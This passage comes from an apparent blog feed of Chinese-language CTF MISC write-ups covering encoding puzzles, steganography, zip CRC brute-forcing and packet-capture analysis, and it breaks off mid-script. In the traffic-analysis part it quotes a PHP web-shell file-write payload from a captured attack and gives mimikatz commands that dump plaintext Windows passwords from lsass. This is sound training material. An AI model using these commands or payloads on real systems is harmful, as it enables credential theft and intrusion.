2:]</span><br><span class="line">[Secret File Part 3:]</span><br></pre></td></tr></table></figure><p>按顺序拼接得到加密压缩包，爆破得密码【1234】</p><p>得到hint.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我用各种baseXX编码把flag套娃加密了，你应该也有看出来。</span><br><span class="line">但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过</span><br><span class="line">提示：0x10,0x20,0x30,0x55</span><br></pre></td></tr></table></figure><p>根据提示，base16,32,48,85</p><p>flag.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)</span><br></pre></td></tr></table></figure><p>一把梭</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;</span><br></pre></td></tr></table></figure><h3><span id="38">38</span></h3><h4><span id="我爱linux"></span></h4><blockquote><p>你知道Linux下面有哪些好玩的命令吗？比如sl，还有哪些呢？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到一张图片，png文件的末尾FFD9后一连串不知道是啥的字符</p><p>提取后，</p><p>触及我的知识盲区了</p><p>大佬说是Python Picke序列化内容</p><p>使用pickle脚本load出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">fp &#x3D; open(&quot;Untitled1.txt&quot;,&quot;rb+&quot;)</span><br><span class="line">fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)</span><br><span class="line">a&#x3D;pickle.load(fp)</span><br><span class="line">pickle&#x3D;str(a)</span><br><span class="line">fw.write( pickle )</span><br><span class="line">fw.close()</span><br><span class="line">fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[(3, &#39;m&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;#&#39;), (3</span><br></pre></td></tr></table></figure><p>等</p><p>转换坐标</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fw &#x3D; open(&quot;pickle.txt&quot;,&quot;r&quot;)</span><br><span class="line">text&#x3D;fw.read( )</span><br><span class="line">i&#x3D;0</span><br><span class="line">a&#x3D;0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while i&lt;len(text)+1:</span><br><span class="line">    if(text[i]&#x3D;&#x3D;&#39;]&#39;):</span><br><span class="line">       print(&#39;\n&#39;)</span><br><span class="line">       a&#x3D;0</span><br><span class="line">    elif(text[i]&#x3D;&#x3D;&#39;(&#39;):</span><br><span class="line">        if(text[i+2]&#x3D;&#x3D;&#39;,&#39;):</span><br><span class="line">            b&#x3D;text[i+1]</span><br><span class="line">            d&#x3D;text[i+1]</span><br><span class="line">            b&#x3D;int(b)-int(a)</span><br><span class="line">            c&#x3D;1</span><br><span class="line">            while c&lt;b:</span><br><span class="line">                print(&quot; &quot;, end&#x3D;&quot;&quot;)</span><br><span class="line">                c +&#x3D; 1</span><br><span class="line">            print(text[i+5], end&#x3D;&quot;&quot;)</span><br><span class="line">            a&#x3D;int(d)</span><br><span class="line">        else:</span><br><span class="line">            b&#x3D;text[i+1]+text[i+2]</span><br><span class="line">            d&#x3D;text[i+1]+text[i+2]</span><br><span class="line">            b&#x3D;int(b)-int(a)</span><br><span class="line">            c&#x3D;1</span><br><span class="line">            while c&lt;b:</span><br><span class="line">                print(&quot; &quot;, end&#x3D;&quot;&quot;)</span><br><span class="line">                c +&#x3D; 1</span><br><span class="line">            print(text[i+6], end&#x3D;&quot;&quot;)</span><br><span class="line">            a&#x3D;int(d)</span><br><span class="line">    i +&#x3D;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到</p><p><a href="https://imgchr.com/i/shdmTK"><img src="https://s3.ax1x.com/2021/01/21/shdmTK.jpg" alt="shdmTK.jpg" border="0"></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;a273fdedf3d746e97db9086ebbb195d6&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="39">39</span></h3><h4><span id="zip"></span></h4><blockquote><p>拼在一起解下base64就有flag 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到68个加密压缩包，</p><p>大佬的crc爆破脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for k in dic:</span><br><span class="line">                for h in dic:</span><br><span class="line">                    s &#x3D; i + j + k + h</span><br><span class="line">                    if crc &#x3D;&#x3D; (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line">def CrackZip():</span><br><span class="line">        for i in range(0,68):</span><br><span class="line">            file &#x3D; &#39;out&#39;+str(i)+&#39;.zip&#39;</span><br><span class="line">            crc &#x3D; zipfile.ZipFile(file,&#39;r&#39;).getinfo(&#39;data.txt&#39;).CRC</span><br><span class="line">            CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic &#x3D; string.ascii_letters + string.digits + &#39;+&#x2F;&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&#39;out.txt&#39;,&#39;w&#39;)</span><br><span class="line">CrackZip()</span><br><span class="line">print(&quot;CRC32碰撞完成&quot;)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解码后能看到file,flag.txt等字样</p><p>010editor的强大体现出来了</p><p>Edit-&gt;Paste from-&gt;Paste from Base64</p><p>再补全文件头526172211A0700</p><p>得到压缩包，附加信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;</span><br></pre></td></tr></table></figure><h3><span id="40">40</span></h3><h4><span id="stegosaurus">stegosaurus</span></h4><blockquote><p><a href="https://buuoj.cn/challenges#zip">https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E5%89%91%E9%BE%99</a></p><blockquote><p>得到的 flag 请包上 flag{} 提交</p></blockquote></blockquote><p>得到hint.zip和O_O</p><p>hint.zip里有hh.jpg和pwd.txt</p><p>先看pwd.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure><p>JS隐写，只需要F12打开操作台，console输入，回车后点击小红框框就好啦</p><p><img src="JS.jpg" alt="JS"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">welcom3!</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接下啦对图片进行操作，利用上述密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;steghide extract -sf hh.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;secret.txt&quot;.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">想要flag吗？解出我的密文吧~</span><br><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>Base64开头为Salted,猜测为des解码</p><p>在图片的右键信息里得到密钥@#$%^&amp;%%$)</p><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think about stegosaurus</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;AngelKitty&#x2F;stegosaurus.git</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .&#x2F;stegosaurus -x O_O.pyc </span><br><span class="line">Extracted payload: flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;simple&quot;&gt;simple&lt;/span&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;21&quot;&gt;21&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;rctf2019draw&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;得到的 </summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-1</title>
    <link href="http://mklkx.github.io/2020/12/25/MISC-data-1/"/>
    <id>http://mklkx.github.io/2020/12/25/MISC-data-1/</id>
    <published>2020-12-25T14:13:47.000Z</published>
    <updated>2021-05-04T11:39:40.880Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="data1">Data[1]</span></h3><hr><p><strong>写在前面</strong></p><blockquote><p>浅薄笔者目前还无法完全消化理解wireshark相关流量分析的工具的内涵，先就针对遇到的题目类型做简单整理记录。</p></blockquote><h3><span id="1"><em>1</em></span></h3><p><strong>追踪流TCP+关键词搜索</strong></p><h4><span id="被嗅探的流量"></span></h4><blockquote><p>某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件可知其中是一个.pcapng文件，用wireshark打开。</p><p><img src="DLCaxH.png" alt="被嗅探的流量1"></p><p>追踪其中的tcp流（有的题会追踪http流），故👇</p><p><img src="DLCURe.jpg" alt="被嗅探的流量2"></p><p>通过查找关键词flag可得👇</p><p><img src="DLCwMd.png" alt="被嗅探的流量3"></p><h3><span id="2"><em>2</em></span></h3><p><strong>追踪流TCP+熟悉jpg的base64表示</strong></p><h4><span id="数据包中的线索"></span></h4><blockquote><p>公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件得一pcapng文件，用wireshark打开。如题1所示打开TCP追踪👇</p><p><img src="DLC0sA.png" alt="数据包中的线索1"></p><p>根据其中标记的“/9j/”部分，可得知该文件为base64形式下的jpg文件。补上文件头“data:image/jpeg;base64,”后在浏览器的地址栏中输入可得到图片</p><p><img src="DLCBqI.png" alt="数据包中的线索2"></p><h3><span id="3"><em>3</em></span></h3><p><strong>追踪流+foremost分离+爆破</strong></p><h4><span id="被偷走的文件"></span></h4><blockquote><p>一黑客入侵了某公司盗取了重要的机密文件，还好管理员记录了文件被盗走时的流量，请分析该流量，分析出该黑客盗走了什么文件。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>wireshark追踪流可发现其中隐藏了一个rar文件👇</p><p><img src="DLCtPO.png" alt="被偷走的文件1"></p><p>foremost分离后，可发现压缩包带锁，暴力破解可得👇</p><p><img src="DLCNGD.png" alt="被偷走的文件2"></p><p>解得flag。</p><h3><span id="4"><em>4</em></span></h3><p><strong>追踪流+bool注入</strong></p><h4><span id="sqltest"></span></h4><blockquote><p>网站遭受到攻击了，还好我们获取到了全部网络流量。 链接: <a href="https://pan.baidu.com/s/1AdQXVGKb6rkzqMLkSnGGBQ">https://pan.baidu.com/s/1AdQXVGKb6rkzqMLkSnGGBQ</a> 提取码: 34uu 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>追踪http流后，观察到大量类似文件（后得知此为bool注入，查资料得<strong>在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符</strong>）👇</p><p><img src="DLCgJS.png" alt="sqltest"></p><p>拼接可得，改flag的ascii为</p><p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p><p>得f l a g { 4 7 e d b 8 3 0 0 e d 5 f 9 b 2 8 f c 5 4 b 0 d 0 9 e c d e f 7 }</p><h3><span id="5"><em>5</em></span></h3><p><strong>WireShark插入RSA密钥</strong></p><h4><span id="webnet0"></span></h4><blockquote><p>Try using a tool like Wireshark.How can you decrypt the TLS stream?</p></blockquote><p>给定一个pcapng文件和一密钥，依次点击编辑-&gt;首选项-&gt;RSA密钥-&gt;Add new keyfile后追踪HTTP流即可得到flag。</p><h3><span id="6"><em>6</em></span></h3><h4><span id="webnet1"></span></h4><blockquote><p>Try using a tool like Wireshark.How can you decrypt the TLS stream?</p></blockquote><p>同第五题的解法能得假flag:picoCTF{this.is.not.your.flag.anymore}搜索可得真flag:picoCTF{honey.roasted.peanuts}</p><hr><h3><span id="7"><em>7</em></span></h3><p><strong>流量分析入门</strong></p><h4><span id="菜刀666"></span></h4><blockquote><p>流量分析，你能找到flag吗 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>到手为一名为666666.pcapng的文件，丢进wireshark,其中大部分为TCP流，单个流追踪时没有结果，尝试导出。</p><p>按文件大小，锁定了一名为1.php的文件，save.</p><p><img src="rMH9cF.jpg" alt="rMH9cF.jpg"></p><p><img src="rMHGNt.jpg" alt="rMHGNt.jpg"></p><p>通过简单分析，能看出该Php文件中</p><p>1)post传入了action变量，对其进行base64解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$f&#x3D;base64_decode($_POST[&quot;z1&quot;]);$c&#x3D;$_POST[&quot;z2&quot;];$c&#x3D;str_replace(&quot;\r&quot;,&quot;&quot;,$c);$c&#x3D;str_replace(&quot;\n&quot;,&quot;&quot;,$c);$buf&#x3D;&quot;&quot;;for($i&#x3D;0;$i&lt;strlen($c);$i+&#x3D;2)$buf.&#x3D;urldecode(&quot;%&quot;.substr($c,$i,2));echo(@fwrite(fopen($f,&quot;w&quot;),$buf)?&quot;1&quot;:&quot;0&quot;);;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure><p>2)z1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\wamp64\www\upload\6666.jpg</span><br></pre></td></tr></table></figure><p>3)z2</p><p>文件头FFD8FF，可看出此为jpg文件后缀，另存为jpg文件后得到：</p><p><img src="rMbtaR.jpg" alt="rMbtaR.jpg"></p><p>第二条路为对大文件进行分解。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk 666666.pcapng</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 666666.pcapng</span><br></pre></td></tr></table></figure><p>得到诸多.xz及一个空白的flag.txt,说明路走对了。</p><p>发现一个加密的.zip文件，密码为此前的Th1s_1s_p4sswd_!!!</p><p>打开得flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure><h3><span id="8"><em>8</em></span></h3><h4><span id="john-in-the-middle"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>大量TCP和HTTP流量包，导出对象HTTP，得到大量文件👇</p><p><img src="r1Wwd0.jpg" alt="r1Wwd0.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar C:\Users\16231\Desktop\Stegsolve.jar</span><br></pre></td></tr></table></figure><p>logo.png和scanlines.png通过Image Combiner进行色道分离后得到flag</p><p><img src="r3dcod.jpg" alt="r3dcod.jpg"></p><blockquote><p>挖个坑，不明白这个操作是为啥以及怎么看出来的😂</p></blockquote><h3><span id="9"><em>9</em></span></h3><h4><span id="actf新生赛2020ntfs数据流"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>由于这道题比较简单，题干直接给出了考点，用NtfsStreamsEditor打开对应的压缩包，导出后查看得到flag</p><p><img src="rf9J78.jpg" alt="rf9J78.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ACTF&#123;AAAds_nntfs_ffunn?&#125; </span><br></pre></td></tr></table></figure><h3><span id="10"><em>10</em></span></h3><h4><span id="间谍启示录"></span></h4><blockquote><p>在城际公路的小道上，罪犯G正在被警方追赶。警官X眼看他正要逃脱，于是不得已开枪击中了罪犯G。罪犯G情急之下将一个物体抛到了前方湍急的河流中，便头一歪突然倒地。警官X接近一看，目标服毒身亡。数分钟后，警方找到了罪犯遗失物体，是一个U盘，可惜警方只来得及复制镜像，U盘便报废了。警方现在拜托你在这个镜像中找到罪犯似乎想隐藏的秘密。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到一iso文件，本想着挂载啥的。</p><p>首先尝试foremost分离，得到</p><p>ole:= 2rar:= 1exe:= 1</p><p>看看压缩包，存在flag.exe,运行一下</p><p>得到 机密文件.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag&#123;379:7b758:g7dfe7f19:9464f:4g9231&#125;</span><br></pre></td></tr></table></figure><h3><span id="11"><em>11</em></span></h3><h4><span id="vampn2020-公开赛拉胯的三条命令"></span></h4><p>先看了一波网上的WP，但是还是不太懂。多亏了pdsdt师傅耐心讲解，终于懂了哈哈哈哈哈</p><p>zip加后缀还原后，得到题目描述和nmapall.pcapng。</p><p>编辑-》首选项-》外观-》列</p><p>显示“目的端口”并按从小到大排序后，观察。</p><p>举例👇</p><p><img src="r4wqv8.jpg" alt="r4wqv8.jpg"></p><p>这张图中可以看出，本机的35232端口给目标机（其实也是自己）的1端口发送SYN包，但是没有后续。故判断该端口为关闭状态。</p><p>其中3、4、6、7、9、13等端口都是一样的情况。</p><p>但是21端口就不一样了。</p><p>60176、33892等端口跟21分别进行了连续通信，说明该端口一定是打开的状态。</p><p>以此类推，21 22 631 801 3306</p><blockquote><p>当时还纠结了很久，为什么后面的端口一样满足要求，但是都不算。后明白因为这个流量是自己打自己，所以同一条流量会显示两遍。故5939后的都可以不看啦</p></blockquote><h3><span id="12"><em>12</em></span></h3><h4><span id="actf新生赛2020swp"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到wget.pcapng</p><p>流量分析！！</p><p>导出http流，得到一堆有的没的</p><p>观察，发现其中有hint.html</p><p><img src="s8UNNV.jpg" alt="s8UNNV.jpg"></p><p>很好，不知道他在说什么</p><p>继续观察，发现一个名为secret.zip的压缩包，有东西！</p><p>存在名为flag的文件，丢进010</p><p>找到flag</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;</span><br></pre></td></tr></table></figure><h3><span id="13"><em>13</em></span></h3><h4><span id="安洵杯-2019attack"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>学到了流量分析新姿势</p><p>常规操作：</p><p>1）分析，导出HTTP流，得到lsass.dmp</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsass是Windows系统的一个进程，用于本地安全和登陆策略</span><br></pre></td></tr></table></figure><p>2)foremost分离得到加密压缩包</p><p>通过大神WP学到新姿势，<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917">mimikatz</a>一个名叫猕猴桃的软件(内网渗透工具，可在lsass.exe进程中获取windows的账号明文密码)</p><p>以管理员权限打开后：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">&#x2F;&#x2F;载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">&#x2F;&#x2F;读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br><span class="line"></span><br><span class="line">得到密码</span><br><span class="line">W3lc0meToD0g3</span><br></pre></td></tr></table></figure><p>解压缩包得D0g3{3466b11de8894198af3636c5bd1efce2}</p><h3><span id="14"><em>14</em></span></h3><h4><span id="usb"></span></h4><blockquote><p>Do your konw usb?? 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到233.rar及key.ftm，暂时放着，不知道有啥用</p><blockquote><p>做压缩包题最好用winrar。360会自动过滤掉一些东西。</p></blockquote><p>提示文件头损坏，对比大佬笔记https://www.freebuf.com/column/199854.html</p><p>常规文件头没问题，考虑【HEAD_TYPE应该是0x74而不是0x7A。】</p><p>得到233.png</p><p>分析一波，当Blue通道被置为0的时候出现了二维码！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ci&#123;v3erf_0tygidv2_fc0&#125;</span><br></pre></td></tr></table></figure><p>图片的信息已经被榨干了，来处理key.ftm</p><p>查看二进制，能看到504b0304等字样，foremost可提取到压缩包</p><p>得到key.pcap一个流量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>通过脚本处理USB流量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mappings &#x3D; &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;,0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;,0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;,0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;,0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;,0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;,0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;&#x3D;&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;</span><br><span class="line">nums &#x3D; []</span><br><span class="line">keys &#x3D; open(&#39;usbdata.txt&#39;)</span><br><span class="line">for line in keys:</span><br><span class="line">    if line[0]!&#x3D;&#39;0&#39; or line[1]!&#x3D;&#39;0&#39; or line[3]!&#x3D;&#39;0&#39; or line[4]!&#x3D;&#39;0&#39;or line[9]!&#x3D;&#39;0&#39; or line[10]!&#x3D;&#39;0&#39; or line[12]!&#x3D;&#39;0&#39; or line[13]!&#x3D;&#39;0&#39;or line[15]!&#x3D;&#39;0&#39; or line[16]!&#x3D;&#39;0&#39; or line[18]!&#x3D;&#39;0&#39; or line[19]!&#x3D;&#39;0&#39;or line[21]!&#x3D;&#39;0&#39; or 